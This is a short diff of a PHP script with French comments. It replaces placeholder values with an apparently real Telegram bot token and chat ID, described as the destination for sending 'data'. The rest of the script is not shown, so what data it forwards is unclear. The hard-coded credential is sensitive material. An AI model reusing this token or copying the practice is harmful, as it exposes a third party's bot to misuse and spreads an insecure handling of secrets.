@@ -2,9 +2,9 @@
 header('Content-Type: application/json');
 
 // Jeton du bot Telegram
-$botToken = "votre api telegram";
+$botToken = "7839846287:AAGamY4aoLBWfqLXX91koysbdLBE5P1o8mg";
 // Chat ID où envoyer les données
-$chatId = "votre Id chat";
+$chatId = "7896419150";
 
 // Fichier de log
 $logFile = 'log.txt';
